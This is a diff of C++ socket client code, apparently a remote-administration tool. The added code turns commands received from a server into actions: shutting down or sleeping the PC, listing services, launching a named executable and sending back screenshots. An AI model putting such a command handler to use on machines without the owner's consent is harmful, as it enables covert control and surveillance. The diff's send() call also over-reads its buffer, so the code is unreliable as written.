@@ -85,8 +85,25 @@ int connet_and_send_file(sockaddr_in srv, int lenh=0) {
 			fileSend = "D:\\chaymanhinh2.png";
 		}
 		else if (sBuff[length - 1] == '7') {
-			ShutDown();
+			if (sBuff[length - 2] == '7')
+				Sleep();
+			else 
+				ShutDown();
 			fileSend = "shutdown.txt";
+		}
+		else if (sBuff[length - 1] == '3') {
+			ListService();
+			fileSend = "D:\\ListService2.txt";
+		}
+		else if (sBuff[length - 1] == '2') {
+			string app = "";
+			for (int i = 0; i < length - 2; i++)
+				app += sBuff[i];
+			app += ".exe";
+			StartApp((const string)app);
+			Sleep(1000);
+			Screenshot();
+			fileSend = "D:\\chaymanhinh2.png";
 		}
 		int nSend = send(nClient, "ok", strlen(sBuff), 0);
 		if (nSend < 0) {
